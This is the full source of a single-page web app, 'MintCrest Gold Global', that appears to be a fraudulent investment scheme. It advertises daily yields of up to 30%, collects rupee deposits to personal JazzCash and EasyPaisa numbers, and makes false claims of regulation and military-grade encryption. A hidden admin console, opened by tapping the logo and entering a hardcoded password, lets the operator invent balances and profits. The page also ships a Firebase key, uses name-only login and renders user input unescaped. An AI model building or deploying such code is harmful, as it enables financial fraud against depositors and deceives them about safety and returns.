<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold Global | Official Secure Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000205; color: white; overflow-x: hidden; user-select: none; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .animate-marquee { display: inline-block; animation: marquee 18s linear infinite; white-space: nowrap; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .badge-pending { background: rgba(234, 179, 8, 0.15); color: #fbbf24; padding: 3px 8px; border-radius: 6px; font-size: 8px; font-weight: 800; }
        .badge-approved { background: rgba(34, 197, 94, 0.15); color: #4ade80; padding: 3px 8px; border-radius: 6px; font-size: 8px; font-weight: 800; }
        .badge-rejected { background: rgba(239, 68, 68, 0.15); color: #f87171; padding: 3px 8px; border-radius: 6px; font-size: 8px; font-weight: 800; }
        .gold-glow { box-shadow: 0 0 20px rgba(59, 130, 246, 0.2); }
    </style>
</head>
<body class="h-screen flex flex-col">

    <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" target="_blank" class="fixed bottom-28 right-6 bg-green-500 p-4 rounded-full shadow-2xl z-[500] border-2 border-white/20 active:scale-90 transition-all">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="w-7 h-7" alt="Support">
    </a>

    <div class="bg-blue-900/30 border-b border-blue-500/20 py-2 overflow-hidden z-[500]">
        <div id="ticker-text" class="animate-marquee text-[9px] font-black uppercase tracking-widest text-blue-300 italic">Connecting to Global Asset Nodes... Initializing Security Protocols... Secure Payouts Active.</div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000205] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-extrabold italic tracking-tighter mb-1 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[7px] uppercase tracking-[0.5em] mb-12 font-bold text-blue-400/60 italic">EST. 2026 • REGULATED GLOBAL ASSETS</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl gold-glow">
                <input type="text" id="user-name" placeholder="ENTER LEGAL NAME" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 transition-all uppercase text-[12px]">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-lg active:scale-95 transition-all">ESTABLISH SECURE LINK</button>
            </div>
            <p class="mt-8 text-[7px] text-gray-600 font-bold uppercase tracking-widest italic">Encrypted by AES-256 Military Standard</p>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-40">
        
        <div id="p-home" class="page active-page p-6">
            <div class="mb-4 flex justify-between items-end px-2">
                <div>
                    <p class="text-[7px] font-black text-gray-500 uppercase tracking-widest">Asset Manager</p>
                    <h3 id="display-username" class="text-lg font-black italic text-blue-400 uppercase tracking-tight">GUEST</h3>
                </div>
                <div class="text-right">
                    <span class="bg-green-500/10 text-green-500 text-[6px] px-3 py-1 rounded-full border border-green-500/20 font-black uppercase italic">SERVER: NY-04</span>
                </div>
            </div>

            <div class="glass p-10 rounded-[3.5rem] mb-6 border-l-8 border-blue-600 shadow-2xl relative overflow-hidden">
                <div class="absolute -top-4 -right-4 opacity-5 text-7xl font-black italic">GOLD</div>
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-[0.2em] italic">Portfolio Net Balance</p>
                <h2 class="text-5xl font-black tracking-tighter mb-4" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="text-[10px] font-extrabold text-yellow-500 uppercase italic bg-yellow-500/5 py-1 px-3 rounded-lg inline-block border border-yellow-500/10">SYNCING NODES...</div>
                <div class="mt-8 flex gap-3">
                    <div class="flex-1 bg-white/5 p-4 rounded-3xl border border-white/5">
                        <p class="text-[6px] text-gray-500 font-bold uppercase mb-1">Total Profits</p>
                        <span class="text-[10px] text-green-400 font-black" id="v-profit">₨ 0</span>
                    </div>
                    <div class="flex-1 bg-white/5 p-4 rounded-3xl border border-white/5">
                        <p class="text-[6px] text-gray-500 font-bold uppercase mb-1">Account Tier</p>
                        <span id="tier-tag" class="text-[10px] text-blue-400 font-black italic">INACTIVE</span>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 border-b-4 border-blue-600 font-black text-[10px] uppercase italic">📥 Deposit</button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 border-b-4 border-red-600 font-black text-[10px] uppercase italic">📤 Withdraw</button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-500 text-xl tracking-tighter">Trading Fleet Registry</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-20"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400 text-xl tracking-tighter">Vault Activity Ledger</h2>
            <div id="user-history" class="space-y-3 pb-20"></div>
        </div>
        
        <div id="p-more" class="page p-6 space-y-6 pb-20">
            <div class="glass p-8 rounded-[3.5rem] text-center border-t-4 border-yellow-500 shadow-xl">
                <h3 class="text-yellow-500 font-black text-[10px] uppercase mb-4 italic tracking-widest">🎁 Activate VIP Promo Code</h3>
                <input type="text" id="user-promo-input" placeholder="CODE (e.g. TRUST784)" class="w-full bg-white/5 p-5 rounded-2xl text-[12px] text-center font-bold mb-5 border border-yellow-500/20 outline-none uppercase tracking-widest">
                <button onclick="claimPromo()" class="w-full bg-yellow-600 py-4 rounded-2xl font-black text-[10px] uppercase shadow-lg active:scale-95">REDEEM BONUS ASSETS</button>
            </div>
            
            <div class="glass p-8 rounded-[3.5rem] border-l-4 border-green-500">
                <h3 class="text-green-500 font-black text-[10px] uppercase mb-4 italic">Community Headquarters</h3>
                <p class="text-[9px] text-gray-500 mb-6 italic uppercase font-bold text-center">Join 5,000+ Investors Globally</p>
                <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="w-full bg-green-600 py-5 rounded-2xl font-black text-[10px] uppercase shadow-lg block text-center active:scale-95">JOIN WHATSAPP COMMUNITY</a>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[3rem] text-center text-[10px] font-black text-red-500 uppercase italic border border-red-500/20">Terminate Secure Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic tracking-widest">Deposit Hub</h3>
                <div class="space-y-3 mb-8 text-[11px] font-black text-left">
                    <div class="glass p-5 rounded-2xl flex justify-between items-center">
                        <div><p class="text-[7px] text-gray-500 uppercase">JazzCash</p><span>03705519562</span></div>
                        <button onclick="navigator.clipboard.writeText('03705519562')" class="text-blue-500 text-[8px] bg-blue-500/10 px-3 py-1 rounded-md">COPY</button>
                    </div>
                    <div class="glass p-5 rounded-2xl flex justify-between items-center">
                        <div><p class="text-[7px] text-gray-500 uppercase">EasyPaisa</p><span>03379827882</span></div>
                        <button onclick="navigator.clipboard.writeText('03379827882')" class="text-green-500 text-[8px] bg-green-500/10 px-3 py-1 rounded-md">COPY</button>
                    </div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (₨)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-black border border-white/5 outline-none text-lg">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold uppercase border border-white/5 outline-none text-[12px]">
                <input type="file" id="dep-proof" class="hidden">
                <button onclick="document.getElementById('dep-proof').click()" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-[9px] font-black border-2 border-dashed border-white/10 uppercase italic">Attach Screenshot Proof</button>
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[11px] uppercase shadow-xl active:scale-95">LOG DEPOSIT REQUEST</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 text-center shadow-2xl">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm italic tracking-widest">Authorize Payout</h3>
                <input type="number" id="wd-amt" placeholder="Min Withdrawal ₨ 100" class="w-full bg-white/5 p-6 rounded-2xl mb-4 text-center font-black border border-white/5 outline-none text-lg">
                <input type="text" id="wd-acc" placeholder="ACCOUNT NAME & WALLET NO." class="w-full bg-white/5 p-6 rounded-2xl mb-8 text-center text-[10px] font-bold border border-white/5 outline-none uppercase">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[11px] uppercase shadow-xl active:scale-95">REQUEST PAYOUT</button>
                <p class="text-[7px] text-gray-600 mt-6 uppercase font-bold italic">Estimated Processing Time: 2-24 Hours</p>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000205] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-2xl font-black text-blue-500 uppercase italic tracking-tighter">Super Admin</h2>
            <button onclick="closeAdmin()" class="bg-red-500 text-white px-6 py-2 rounded-xl text-[10px] font-black uppercase">Close Console</button>
        </div>

        <div class="glass p-6 rounded-[2.5rem] border-b-4 border-blue-600 mb-8">
            <h3 class="text-[10px] font-black uppercase mb-4 text-blue-400 tracking-widest">Update Global Broadcast</h3>
            <textarea id="broadcast-input" placeholder="Type message for all users..." class="w-full bg-white/5 p-4 rounded-xl text-[12px] outline-none border border-white/10 font-bold mb-4 h-20"></textarea>
            <button onclick="updateBroadcast()" class="w-full bg-blue-600 py-4 rounded-2xl font-black text-[10px] uppercase">Update Live Ticker</button>
        </div>

        <div id="adm-stats" class="grid grid-cols-3 gap-2 mb-8 text-center"></div>
        
        <div class="flex gap-2 mb-8">
            <button onclick="showAdmTab('requests')" class="bg-blue-600 flex-1 py-4 rounded-2xl text-[10px] font-black uppercase italic">User Requests</button>
            <button onclick="showAdmTab('users')" class="glass flex-1 py-4 rounded-2xl text-[10px] font-black uppercase italic">User Accounts</button>
        </div>

        <div id="adm-sec-requests" class="adm-tab space-y-3"></div>
        <div id="adm-sec-users" class="adm-tab hidden space-y-4">
             <input type="text" id="user-search" onkeyup="filterUsers()" placeholder="SEARCH USER NAME..." class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-[12px] outline-none border border-white/10 font-bold uppercase tracking-widest text-center">
             <div id="user-list-inner"></div>
        </div>

        <div class="glass p-10 rounded-[3.5rem] mt-10 border-t-2 border-green-500 shadow-2xl">
             <h3 class="text-[11px] font-black uppercase mb-6 text-center text-green-500 italic tracking-[0.3em]">Master Access Portal</h3>
             <input type="text" id="adm-user" placeholder="USER FULL NAME" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center text-[12px] font-bold border border-white/10 outline-none uppercase tracking-widest">
             <input type="number" id="adm-val" placeholder="ENTER NUMERIC VALUE" class="w-full bg-white/5 p-5 rounded-2xl mb-6 text-center text-[12px] font-black border border-white/10 outline-none">
             
             <div class="grid grid-cols-2 gap-3 mb-3">
                 <button onclick="manualEdit('balance')" class="bg-blue-600 py-4 rounded-2xl font-black text-[9px] uppercase shadow-lg">Set Balance</button>
                 <button onclick="manualEdit('profit')" class="bg-green-600 py-4 rounded-2xl font-black text-[9px] uppercase shadow-lg">Set Profit</button>
             </div>
             <div class="grid grid-cols-2 gap-3">
                 <button onclick="manualEdit('activeTier')" class="bg-yellow-600 py-4 rounded-2xl font-black text-[9px] uppercase shadow-lg">Set Plan Price</button>
                 <button onclick="manualEdit('tierROI')" class="bg-purple-600 py-4 rounded-2xl font-black text-[9px] uppercase shadow-lg">Set Daily ROI %</button>
             </div>
             <input type="text" id="adm-tiername" placeholder="SET NEW CUSTOM STATUS NAME" class="w-full bg-white/5 p-5 rounded-2xl mt-6 text-center text-[9px] font-bold border border-white/10 outline-none uppercase tracking-widest">
             <button onclick="updateTierName()" class="w-full bg-white/10 py-4 rounded-2xl font-black text-[9px] uppercase mt-3 border border-white/5">Update Custom Status</button>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4.5rem] shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-1 active-tab text-[9px] font-black italic">🏠<br>VAULT</button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-1 text-[9px] font-black italic">📈<br>FLEETS</button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-1 text-[9px] font-black italic">📜<br>LEDGER</button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-1 text-[9px] font-black italic">🏢<br>FIRM</button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        // Investment Plans Configuration
        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3, d: 30 }, { n: "Micro-Elite II", p: 500, r: 3.2, d: 30 }, { n: "Micro-Elite III", p: 800, r: 3.4, d: 30 },
            { n: "Bronze-S", p: 1000, r: 3.5, d: 30 }, { n: "Bronze-X", p: 1500, r: 3.8, d: 30 }, { n: "Bronze-VIP", p: 2000, r: 4, d: 30 },
            { n: "Silver-S", p: 3000, r: 4.2, d: 60 }, { n: "Silver-X", p: 4000, r: 4.5, d: 60 }, { n: "Silver-VIP", p: 5000, r: 4.8, d: 60 },
            { n: "Gold-S", p: 7000, r: 5, d: 60 }, { n: "Gold-X", p: 9000, r: 5.3, d: 60 }, { n: "Gold-Master", p: 15000, r: 6, d: 60 },
            { n: "Diamond-Lite", p: 20000, r: 7, d: 60 }, { n: "Diamond-Pro", p: 30000, r: 8.5, d: 60 }, { n: "Diamond-VIP", p: 50000, r: 10, d: 60 },
            { n: "Ruby-Expert", p: 75000, r: 12, d: 90 }, { n: "Sapphire-Elite", p: 100000, r: 15, d: 90 },
            { n: "Royal Crown I", p: 150000, r: 18, d: 90 }, { n: "Royal Crown II", p: 200000, r: 20, d: 90 }, { n: "Imperial King", p: 500000, r: 25, d: 120 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, d: 1, s: true }, { n: "⚡ FLASH 48H", p: 2000, r: 15, d: 2, s: true },
            { n: "👑 CROWN KING", p: 25000, r: 22, d: 7, s: true }, { n: "👑 EMPEROR", p: 100000, r: 30, d: 7, s: true },
            { n: "🎁 INVESTOR'S CHOICE", p: 100, r: 2.5, d: 15 }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000); 
            // Real-time Broadcast Sync
            db.collection("app_data").doc("broadcast").onSnapshot(doc => { if(doc.exists) document.getElementById('ticker-text').innerText = doc.data().message; });
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive" });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            document.getElementById('display-username').innerText = name;
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); document.getElementById('tier-tag').innerText = user.tierName; checkProfitReq(user); } });
(db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { 
                    list.innerHTML += `<div class="glass p-6 rounded-[2rem] flex justify-between items-center border-l-4 border-blue-600 mb-3 text-[10px] font-black uppercase italic">
                        <div>${d.type}<br><span class="opacity-30 text-[8px]">${new Date(d.time).toLocaleTimeString()}</span></div>
                        <div class="text-right">₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div>
                    </div>`; 
                });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => { 
                const totalReturn = Math.floor((p.p * p.r / 100) * p.d);
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-6 rounded-[2.5rem] flex justify-between items-center active:scale-95 cursor-pointer mb-3 border border-white/5">
                    <div><h4 class="font-black text-[12px] uppercase ${p.s ? 'text-blue-400' : ''}">${p.n}</h4>
                    <p class="text-[7px] text-gray-500 font-bold uppercase">${p.d} DAYS CONTRACT</p>
                    <p class="text-[9px] text-green-400 font-black uppercase mt-1 italic">${p.r}% Daily Yield</p></div>
                    <div class="text-right"><div class="font-black text-lg tracking-tighter">₨ ${p.p.toLocaleString()}</div>
                    <div class="text-[7px] opacity-40 font-bold italic uppercase">Return: ₨ ${totalReturn.toLocaleString()}</div></div>
                </div>`; 
            });
        }

        async function submitDeposit() { 
            const a = document.getElementById('dep-amount').value; 
            const t = document.getElementById('dep-trx').value; 
            const f = document.getElementById('dep-proof'); 
            if(!a || !t || !f.files[0]) return alert("Sweetie, please fill all fields!"); 
            const r = new FileReader(); r.readAsDataURL(f.files[0]); 
            r.onload = async () => { 
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: r.result, type: "deposit", status: "pending", time: Date.now() }); 
                alert("Deposit request logged securely!"); changePage('activity'); 
            }; 
        }

        async function submitWithdraw() { 
            const a = document.getElementById('wd-amt').value; 
            const acc = document.getElementById('wd-acc').value; 
            if(!a || parseInt(a) < 100) return alert("Minimum withdrawal is ₨ 100"); 
            if(parseInt(a) > user.balance) return alert("Insufficient balance in vault!"); 
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() }); 
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) }); 
            alert("Payout request authorized!"); changePage('activity'); 
        }

        async function buy(p, roi, tName) { 
            if(user.balance < p) { alert("Liquidity low! Please deposit first."); changePage('wallet'); } 
            else { if(confirm("Activate " + tName + " trading fleet?")) { 
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, lastReqTime: Date.now() }); 
                alert("Fleet is now operational!"); changePage('activity'); 
            } } 
        }

        async function claimPromo() { 
            const c = document.getElementById('user-promo-input').value; 
            if(!c) return; 
            await db.collection("requests").add({ user: user.name, type: "Promo Claim", promo: c, status: "pending", time: Date.now(), amount: 0 }); 
            alert("Promo code sent for verification!"); 
            document.getElementById('user-promo-input').value = ''; 
        }

        async function checkProfitReq(u) { 
            if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { 
                const amt = (u.activeTier * u.tierROI) / 100; 
                await db.collection("requests").add({ user: u.name, amount: amt, type: "Daily Profit Yield", status: "pending", time: Date.now() }); 
                await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); 
            } 
        }

        function updateCountdown() { 
            if (user && user.activeTier > 0) { 
                const d = (user.lastReqTime + 86400000) - Date.now(); 
                if(d>0) { 
                    const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); const s = Math.floor((d%60000)/1000); 
                    document.getElementById('countdown-display').innerText = `NEXT YIELD: ${h}H ${m}M ${s}S`; 
                } else { document.getElementById('countdown-display').innerText = "YIELD READY"; } 
            } else { document.getElementById('countdown-display').innerText = "SYSTEM IDLE"; } 
        }

        function changePage(p) { 
            document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); 
            document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); 
            document.getElementById('p-'+p).classList.add('active-page'); 
            if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); 
        }

        function logout() { localStorage.removeItem('mc_user'); location.reload(); }

        // ADMIN FUNCTIONS
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("ENTER MASTER ACCESS KEY:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } setTimeout(()=>tapCount=0,3000); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }

        async function updateBroadcast() { 
            const msg = document.getElementById('broadcast-input').value; 
            if(!msg) return; 
            await db.collection("app_data").doc("broadcast").set({ message: msg }); 
            alert("Global broadcast updated!"); 
        }

        async function updateTierName() { 
            const u = document.getElementById('adm-user').value.toUpperCase().trim(); 
            const n = document.getElementById('adm-tiername').value.toUpperCase().trim(); 
            if(!u || !n) return; 
            await db.collection("users").doc(u).update({ tierName: n }); 
            alert("Custom status updated!"); 
        }

        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { 
                    const d = doc.data(); 
                    const pBtn = d.proof ? `<button onclick="window.open().document.write('<img src=\\'${d.proof}\\' style=\\'width:100%\\' />')" class="bg-blue-600 px-3 py-1 rounded text-[8px] font-black">VIEW PROOF</button>` : '';
                    list.innerHTML += `<div class="glass p-5 rounded-2xl flex justify-between items-center text-[9px] font-black uppercase mb-3 border-l-4 border-blue-500">
                        <div>${d.user}<br>${d.type}<br>Rs ${d.amount}</div>
                        <div class="flex gap-2">${pBtn}<button onclick="handleReq('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-3 py-1 rounded">APPROVE</button>
                        <button onclick="handleReq('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="bg-red-600 px-3 py-1 rounded">REJECT</button></div>
                    </div>`;
                });
            });

            db.collection("users").onSnapshot(snap => {
                const inner = document.getElementById('user-list-inner'); inner.innerHTML = '';
                let totalBal = 0; snap.forEach(doc => { totalBal += (doc.data().balance || 0); });
                document.getElementById('adm-stats').innerHTML = `<div class="glass p-4 rounded-2xl"><p class="text-[7px] opacity-50 uppercase">TOTAL USERS</p><p class="text-[12px] font-black">${snap.size}</p></div>
                <div class="glass p-4 rounded-2xl"><p class="text-[7px] opacity-50 uppercase">TOTAL ASSETS</p><p class="text-[12px] font-black">₨ ${totalBal.toLocaleString()}</p></div>
                <div class="glass p-4 rounded-2xl"><p class="text-[7px] opacity-50 uppercase">SYSTEM</p><p class="text-[12px] font-black italic text-green-400">ENCRYPTED</p></div>`;
                snap.forEach(doc => { 
                    const u = doc.data(); 
                    inner.innerHTML += `<div class="user-card glass p-5 rounded-2xl mb-3 flex justify-between items-center text-[9px] font-black uppercase" data-name="${u.name}">
                        <div>${u.name}</div><div>Bal: ₨ ${u.balance}<br>ROI: ${u.tierROI}%</div>
                    </div>`; 
                });
            });
        }

        async function handleReq(id, uName, baseAmt, act, type) {
            if(act === 'rejected') { 
                if(type === 'withdraw') {
                    const ref = db.collection("users").doc(uName);
                    const doc = await ref.get();
                    await ref.update({ balance: (doc.data().balance || 0) + baseAmt });
                }
                await db.collection("requests").doc(id).update({ status: 'rejected' }); return; 
            }
            const ref = db.collection("users").doc(uName); const doc = await ref.get(); let finalAmt = baseAmt;
            if(type === "Promo Claim") { finalAmt = parseInt(prompt("Enter Bonus Amount to add:", "100")); if(isNaN(finalAmt)) return; await db.collection("requests").doc(id).update({ amount: finalAmt }); }
            if(['deposit', 'Daily Profit Yield', 'Promo Claim'].includes(type)) { await ref.update({ balance: (doc.data().balance||0)+finalAmt, profit: (doc.data().profit||0)+(type.includes('Profit')?finalAmt:0) }); }
            await db.collection("requests").doc(id).update({ status: 'approved' });
        }

        function filterUsers() { 
            const term = document.getElementById('user-search').value.toLowerCase(); 
            document.querySelectorAll('.user-card').forEach(c => c.style.display = c.getAttribute('data-name').toLowerCase().includes(term) ? 'flex' : 'none'); 
        }

        async function manualEdit(f) { 
            const u = document.getElementById('adm-user').value.toUpperCase().trim(); 
            const v = parseFloat(document.getElementById('adm-val').value); 
            if(!u || isNaN(v)) return; 
            const ref = db.collection("users").doc(u); 
            await ref.update({ [f]: v }); 
            alert("User asset updated successfully!"); 
        }
    </script>
</body>
</html>
